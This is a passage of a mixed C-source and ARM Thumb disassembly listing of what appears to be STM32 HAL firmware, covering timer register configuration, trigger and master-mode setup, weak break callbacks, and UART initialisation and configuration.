 80051c8:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80051cc:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80051ce:	683b      	ldr	r3, [r7, #0]
 80051d0:	68db      	ldr	r3, [r3, #12]
 80051d2:	68fa      	ldr	r2, [r7, #12]
 80051d4:	4313      	orrs	r3, r2
 80051d6:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 80051d8:	68fb      	ldr	r3, [r7, #12]
 80051da:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80051de:	683b      	ldr	r3, [r7, #0]
 80051e0:	695b      	ldr	r3, [r3, #20]
 80051e2:	4313      	orrs	r3, r2
 80051e4:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 80051e6:	687b      	ldr	r3, [r7, #4]
 80051e8:	68fa      	ldr	r2, [r7, #12]
 80051ea:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 80051ec:	683b      	ldr	r3, [r7, #0]
 80051ee:	689a      	ldr	r2, [r3, #8]
 80051f0:	687b      	ldr	r3, [r7, #4]
 80051f2:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 80051f4:	683b      	ldr	r3, [r7, #0]
 80051f6:	681a      	ldr	r2, [r3, #0]
 80051f8:	687b      	ldr	r3, [r7, #4]
 80051fa:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 80051fc:	687b      	ldr	r3, [r7, #4]
 80051fe:	4a0c      	ldr	r2, [pc, #48]	; (8005230 <TIM_Base_SetConfig+0xbc>)
 8005200:	4293      	cmp	r3, r2
 8005202:	d007      	beq.n	8005214 <TIM_Base_SetConfig+0xa0>
 8005204:	687b      	ldr	r3, [r7, #4]
 8005206:	4a0b      	ldr	r2, [pc, #44]	; (8005234 <TIM_Base_SetConfig+0xc0>)
 8005208:	4293      	cmp	r3, r2
 800520a:	d003      	beq.n	8005214 <TIM_Base_SetConfig+0xa0>
 800520c:	687b      	ldr	r3, [r7, #4]
 800520e:	4a0a      	ldr	r2, [pc, #40]	; (8005238 <TIM_Base_SetConfig+0xc4>)
 8005210:	4293      	cmp	r3, r2
 8005212:	d103      	bne.n	800521c <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005214:	683b      	ldr	r3, [r7, #0]
 8005216:	691a      	ldr	r2, [r3, #16]
 8005218:	687b      	ldr	r3, [r7, #4]
 800521a:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 800521c:	687b      	ldr	r3, [r7, #4]
 800521e:	2201      	movs	r2, #1
 8005220:	615a      	str	r2, [r3, #20]
}
 8005222:	bf00      	nop
 8005224:	3714      	adds	r7, #20
 8005226:	46bd      	mov	sp, r7
 8005228:	f85d 7b04 	ldr.w	r7, [sp], #4
 800522c:	4770      	bx	lr
 800522e:	bf00      	nop
 8005230:	40012c00 	.word	0x40012c00
 8005234:	40014000 	.word	0x40014000
 8005238:	40014400 	.word	0x40014400

0800523c <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800523c:	b480      	push	{r7}
 800523e:	b087      	sub	sp, #28
 8005240:	af00      	add	r7, sp, #0
 8005242:	60f8      	str	r0, [r7, #12]
 8005244:	60b9      	str	r1, [r7, #8]
 8005246:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 8005248:	68fb      	ldr	r3, [r7, #12]
 800524a:	6a1b      	ldr	r3, [r3, #32]
 800524c:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 800524e:	68fb      	ldr	r3, [r7, #12]
 8005250:	6a1b      	ldr	r3, [r3, #32]
 8005252:	f023 0201 	bic.w	r2, r3, #1
 8005256:	68fb      	ldr	r3, [r7, #12]
 8005258:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800525a:	68fb      	ldr	r3, [r7, #12]
 800525c:	699b      	ldr	r3, [r3, #24]
 800525e:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005260:	693b      	ldr	r3, [r7, #16]
 8005262:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 8005266:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 8005268:	687b      	ldr	r3, [r7, #4]
 800526a:	011b      	lsls	r3, r3, #4
 800526c:	693a      	ldr	r2, [r7, #16]
 800526e:	4313      	orrs	r3, r2
 8005270:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 8005272:	697b      	ldr	r3, [r7, #20]
 8005274:	f023 030a 	bic.w	r3, r3, #10
 8005278:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 800527a:	697a      	ldr	r2, [r7, #20]
 800527c:	68bb      	ldr	r3, [r7, #8]
 800527e:	4313      	orrs	r3, r2
 8005280:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 8005282:	68fb      	ldr	r3, [r7, #12]
 8005284:	693a      	ldr	r2, [r7, #16]
 8005286:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005288:	68fb      	ldr	r3, [r7, #12]
 800528a:	697a      	ldr	r2, [r7, #20]
 800528c:	621a      	str	r2, [r3, #32]
}
 800528e:	bf00      	nop
 8005290:	371c      	adds	r7, #28
 8005292:	46bd      	mov	sp, r7
 8005294:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005298:	4770      	bx	lr

0800529a <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800529a:	b480      	push	{r7}
 800529c:	b087      	sub	sp, #28
 800529e:	af00      	add	r7, sp, #0
 80052a0:	60f8      	str	r0, [r7, #12]
 80052a2:	60b9      	str	r1, [r7, #8]
 80052a4:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 80052a6:	68fb      	ldr	r3, [r7, #12]
 80052a8:	6a1b      	ldr	r3, [r3, #32]
 80052aa:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 80052ac:	68fb      	ldr	r3, [r7, #12]
 80052ae:	6a1b      	ldr	r3, [r3, #32]
 80052b0:	f023 0210 	bic.w	r2, r3, #16
 80052b4:	68fb      	ldr	r3, [r7, #12]
 80052b6:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052b8:	68fb      	ldr	r3, [r7, #12]
 80052ba:	699b      	ldr	r3, [r3, #24]
 80052bc:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80052be:	693b      	ldr	r3, [r7, #16]
 80052c0:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80052c4:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80052c6:	687b      	ldr	r3, [r7, #4]
 80052c8:	031b      	lsls	r3, r3, #12
 80052ca:	693a      	ldr	r2, [r7, #16]
 80052cc:	4313      	orrs	r3, r2
 80052ce:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80052d0:	697b      	ldr	r3, [r7, #20]
 80052d2:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80052d6:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80052d8:	68bb      	ldr	r3, [r7, #8]
 80052da:	011b      	lsls	r3, r3, #4
 80052dc:	697a      	ldr	r2, [r7, #20]
 80052de:	4313      	orrs	r3, r2
 80052e0:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 80052e2:	68fb      	ldr	r3, [r7, #12]
 80052e4:	693a      	ldr	r2, [r7, #16]
 80052e6:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80052e8:	68fb      	ldr	r3, [r7, #12]
 80052ea:	697a      	ldr	r2, [r7, #20]
 80052ec:	621a      	str	r2, [r3, #32]
}
 80052ee:	bf00      	nop
 80052f0:	371c      	adds	r7, #28
 80052f2:	46bd      	mov	sp, r7
 80052f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052f8:	4770      	bx	lr

080052fa <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 80052fa:	b480      	push	{r7}
 80052fc:	b085      	sub	sp, #20
 80052fe:	af00      	add	r7, sp, #0
 8005300:	6078      	str	r0, [r7, #4]
 8005302:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005304:	687b      	ldr	r3, [r7, #4]
 8005306:	689b      	ldr	r3, [r3, #8]
 8005308:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 800530a:	68fb      	ldr	r3, [r7, #12]
 800530c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005310:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 8005312:	683a      	ldr	r2, [r7, #0]
 8005314:	68fb      	ldr	r3, [r7, #12]
 8005316:	4313      	orrs	r3, r2
 8005318:	f043 0307 	orr.w	r3, r3, #7
 800531c:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800531e:	687b      	ldr	r3, [r7, #4]
 8005320:	68fa      	ldr	r2, [r7, #12]
 8005322:	609a      	str	r2, [r3, #8]
}
 8005324:	bf00      	nop
 8005326:	3714      	adds	r7, #20
 8005328:	46bd      	mov	sp, r7
 800532a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800532e:	4770      	bx	lr

08005330 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005330:	b480      	push	{r7}
 8005332:	b087      	sub	sp, #28
 8005334:	af00      	add	r7, sp, #0
 8005336:	60f8      	str	r0, [r7, #12]
 8005338:	60b9      	str	r1, [r7, #8]
 800533a:	607a      	str	r2, [r7, #4]
 800533c:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 800533e:	68fb      	ldr	r3, [r7, #12]
 8005340:	689b      	ldr	r3, [r3, #8]
 8005342:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005344:	697b      	ldr	r3, [r7, #20]
 8005346:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 800534a:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 800534c:	683b      	ldr	r3, [r7, #0]
 800534e:	021a      	lsls	r2, r3, #8
 8005350:	687b      	ldr	r3, [r7, #4]
 8005352:	431a      	orrs	r2, r3
 8005354:	68bb      	ldr	r3, [r7, #8]
 8005356:	4313      	orrs	r3, r2
 8005358:	697a      	ldr	r2, [r7, #20]
 800535a:	4313      	orrs	r3, r2
 800535c:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800535e:	68fb      	ldr	r3, [r7, #12]
 8005360:	697a      	ldr	r2, [r7, #20]
 8005362:	609a      	str	r2, [r3, #8]
}
 8005364:	bf00      	nop
 8005366:	371c      	adds	r7, #28
 8005368:	46bd      	mov	sp, r7
 800536a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800536e:	4770      	bx	lr

08005370 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005370:	b480      	push	{r7}
 8005372:	b085      	sub	sp, #20
 8005374:	af00      	add	r7, sp, #0
 8005376:	6078      	str	r0, [r7, #4]
 8005378:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 800537a:	687b      	ldr	r3, [r7, #4]
 800537c:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005380:	2b01      	cmp	r3, #1
 8005382:	d101      	bne.n	8005388 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005384:	2302      	movs	r3, #2
 8005386:	e04f      	b.n	8005428 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 8005388:	687b      	ldr	r3, [r7, #4]
 800538a:	2201      	movs	r2, #1
 800538c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005390:	687b      	ldr	r3, [r7, #4]
 8005392:	2202      	movs	r2, #2
 8005394:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005398:	687b      	ldr	r3, [r7, #4]
 800539a:	681b      	ldr	r3, [r3, #0]
 800539c:	685b      	ldr	r3, [r3, #4]
 800539e:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 80053a0:	687b      	ldr	r3, [r7, #4]
 80053a2:	681b      	ldr	r3, [r3, #0]
 80053a4:	689b      	ldr	r3, [r3, #8]
 80053a6:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 80053a8:	687b      	ldr	r3, [r7, #4]
 80053aa:	681b      	ldr	r3, [r3, #0]
 80053ac:	4a21      	ldr	r2, [pc, #132]	; (8005434 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053ae:	4293      	cmp	r3, r2
 80053b0:	d108      	bne.n	80053c4 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 80053b2:	68fb      	ldr	r3, [r7, #12]
 80053b4:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 80053b8:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 80053ba:	683b      	ldr	r3, [r7, #0]
 80053bc:	685b      	ldr	r3, [r3, #4]
 80053be:	68fa      	ldr	r2, [r7, #12]
 80053c0:	4313      	orrs	r3, r2
 80053c2:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80053c4:	68fb      	ldr	r3, [r7, #12]
 80053c6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80053ca:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80053cc:	683b      	ldr	r3, [r7, #0]
 80053ce:	681b      	ldr	r3, [r3, #0]
 80053d0:	68fa      	ldr	r2, [r7, #12]
 80053d2:	4313      	orrs	r3, r2
 80053d4:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80053d6:	687b      	ldr	r3, [r7, #4]
 80053d8:	681b      	ldr	r3, [r3, #0]
 80053da:	68fa      	ldr	r2, [r7, #12]
 80053dc:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80053de:	687b      	ldr	r3, [r7, #4]
 80053e0:	681b      	ldr	r3, [r3, #0]
 80053e2:	4a14      	ldr	r2, [pc, #80]	; (8005434 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053e4:	4293      	cmp	r3, r2
 80053e6:	d009      	beq.n	80053fc <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80053e8:	687b      	ldr	r3, [r7, #4]
 80053ea:	681b      	ldr	r3, [r3, #0]
 80053ec:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80053f0:	d004      	beq.n	80053fc <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80053f2:	687b      	ldr	r3, [r7, #4]
 80053f4:	681b      	ldr	r3, [r3, #0]
 80053f6:	4a10      	ldr	r2, [pc, #64]	; (8005438 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 80053f8:	4293      	cmp	r3, r2
 80053fa:	d10c      	bne.n	8005416 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 80053fc:	68bb      	ldr	r3, [r7, #8]
 80053fe:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005402:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005404:	683b      	ldr	r3, [r7, #0]
 8005406:	689b      	ldr	r3, [r3, #8]
 8005408:	68ba      	ldr	r2, [r7, #8]
 800540a:	4313      	orrs	r3, r2
 800540c:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800540e:	687b      	ldr	r3, [r7, #4]
 8005410:	681b      	ldr	r3, [r3, #0]
 8005412:	68ba      	ldr	r2, [r7, #8]
 8005414:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005416:	687b      	ldr	r3, [r7, #4]
 8005418:	2201      	movs	r2, #1
 800541a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800541e:	687b      	ldr	r3, [r7, #4]
 8005420:	2200      	movs	r2, #0
 8005422:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 8005426:	2300      	movs	r3, #0
}
 8005428:	4618      	mov	r0, r3
 800542a:	3714      	adds	r7, #20
 800542c:	46bd      	mov	sp, r7
 800542e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005432:	4770      	bx	lr
 8005434:	40012c00 	.word	0x40012c00
 8005438:	40014000 	.word	0x40014000

0800543c <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 800543c:	b480      	push	{r7}
 800543e:	b083      	sub	sp, #12
 8005440:	af00      	add	r7, sp, #0
 8005442:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 8005444:	bf00      	nop
 8005446:	370c      	adds	r7, #12
 8005448:	46bd      	mov	sp, r7
 800544a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800544e:	4770      	bx	lr

08005450 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005450:	b480      	push	{r7}
 8005452:	b083      	sub	sp, #12
 8005454:	af00      	add	r7, sp, #0
 8005456:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 8005458:	bf00      	nop
 800545a:	370c      	adds	r7, #12
 800545c:	46bd      	mov	sp, r7
 800545e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005462:	4770      	bx	lr

08005464 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005464:	b480      	push	{r7}
 8005466:	b083      	sub	sp, #12
 8005468:	af00      	add	r7, sp, #0
 800546a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 800546c:	bf00      	nop
 800546e:	370c      	adds	r7, #12
 8005470:	46bd      	mov	sp, r7
 8005472:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005476:	4770      	bx	lr

08005478 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 8005478:	b580      	push	{r7, lr}
 800547a:	b082      	sub	sp, #8
 800547c:	af00      	add	r7, sp, #0
 800547e:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005480:	687b      	ldr	r3, [r7, #4]
 8005482:	2b00      	cmp	r3, #0
 8005484:	d101      	bne.n	800548a <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 8005486:	2301      	movs	r3, #1
 8005488:	e040      	b.n	800550c <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 800548a:	687b      	ldr	r3, [r7, #4]
 800548c:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 800548e:	2b00      	cmp	r3, #0
 8005490:	d106      	bne.n	80054a0 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005492:	687b      	ldr	r3, [r7, #4]
 8005494:	2200      	movs	r2, #0
 8005496:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800549a:	6878      	ldr	r0, [r7, #4]
 800549c:	f7fb fd78 	bl	8000f90 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 80054a0:	687b      	ldr	r3, [r7, #4]
 80054a2:	2224      	movs	r2, #36	; 0x24
 80054a4:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 80054a6:	687b      	ldr	r3, [r7, #4]
 80054a8:	681b      	ldr	r3, [r3, #0]
 80054aa:	681a      	ldr	r2, [r3, #0]
 80054ac:	687b      	ldr	r3, [r7, #4]
 80054ae:	681b      	ldr	r3, [r3, #0]
 80054b0:	f022 0201 	bic.w	r2, r2, #1
 80054b4:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 80054b6:	687b      	ldr	r3, [r7, #4]
 80054b8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80054ba:	2b00      	cmp	r3, #0
 80054bc:	d002      	beq.n	80054c4 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80054be:	6878      	ldr	r0, [r7, #4]
 80054c0:	f000 fa54 	bl	800596c <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80054c4:	6878      	ldr	r0, [r7, #4]
 80054c6:	f000 f825 	bl	8005514 <UART_SetConfig>
 80054ca:	4603      	mov	r3, r0
 80054cc:	2b01      	cmp	r3, #1
 80054ce:	d101      	bne.n	80054d4 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80054d0:	2301      	movs	r3, #1
 80054d2:	e01b      	b.n	800550c <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80054d4:	687b      	ldr	r3, [r7, #4]
 80054d6:	681b      	ldr	r3, [r3, #0]
 80054d8:	685a      	ldr	r2, [r3, #4]
 80054da:	687b      	ldr	r3, [r7, #4]
 80054dc:	681b      	ldr	r3, [r3, #0]
 80054de:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 80054e2:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 80054e4:	687b      	ldr	r3, [r7, #4]
 80054e6:	681b      	ldr	r3, [r3, #0]
 80054e8:	689a      	ldr	r2, [r3, #8]
 80054ea:	687b      	ldr	r3, [r7, #4]
 80054ec:	681b      	ldr	r3, [r3, #0]
 80054ee:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 80054f2:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 80054f4:	687b      	ldr	r3, [r7, #4]
 80054f6:	681b      	ldr	r3, [r3, #0]
 80054f8:	681a      	ldr	r2, [r3, #0]
 80054fa:	687b      	ldr	r3, [r7, #4]
 80054fc:	681b      	ldr	r3, [r3, #0]
 80054fe:	f042 0201 	orr.w	r2, r2, #1
 8005502:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005504:	6878      	ldr	r0, [r7, #4]
 8005506:	f000 fad3 	bl	8005ab0 <UART_CheckIdleState>
 800550a:	4603      	mov	r3, r0
}
 800550c:	4618      	mov	r0, r3
 800550e:	3708      	adds	r7, #8
 8005510:	46bd      	mov	sp, r7
 8005512:	bd80      	pop	{r7, pc}

08005514 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005514:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005518:	b08a      	sub	sp, #40	; 0x28
 800551a:	af00      	add	r7, sp, #0
 800551c:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800551e:	2300      	movs	r3, #0
 8005520:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005524:	68fb      	ldr	r3, [r7, #12]
 8005526:	689a      	ldr	r2, [r3, #8]
 8005528:	68fb      	ldr	r3, [r7, #12]
 800552a:	691b      	ldr	r3, [r3, #16]
 800552c:	431a      	orrs	r2, r3
 800552e:	68fb      	ldr	r3, [r7, #12]
 8005530:	695b      	ldr	r3, [r3, #20]
 8005532:	431a      	orrs	r2, r3
 8005534:	68fb      	ldr	r3, [r7, #12]
 8005536:	69db      	ldr	r3, [r3, #28]
 8005538:	4313      	orrs	r3, r2
 800553a:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 800553c:	68fb      	ldr	r3, [r7, #12]
 800553e:	681b      	ldr	r3, [r3, #0]
